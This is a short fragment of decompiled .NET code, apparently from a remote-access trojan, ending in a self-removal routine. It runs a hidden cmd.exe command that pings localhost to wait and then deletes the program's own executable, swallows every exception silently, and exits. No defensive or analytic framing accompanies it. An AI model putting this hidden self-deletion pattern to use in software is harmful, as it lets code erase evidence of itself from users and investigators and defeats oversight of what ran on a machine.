            }
            catch (Exception expr_109)
            {
                ProjectData.SetProjectError(expr_109);
                ProjectData.ClearProjectError();
            }
            try
            {
                Interaction.Shell("cmd.exe /c ping 127.0.0.1 & del \"" + OK.AppFileInfo.FullName + "\"", AppWinStyle.Hide, false, -1);
            }
            catch (Exception expr_13B)
            {
                ProjectData.SetProjectError(expr_13B);
                ProjectData.ClearProjectError();
            }
            ProjectData.EndApp();
        }
    }
}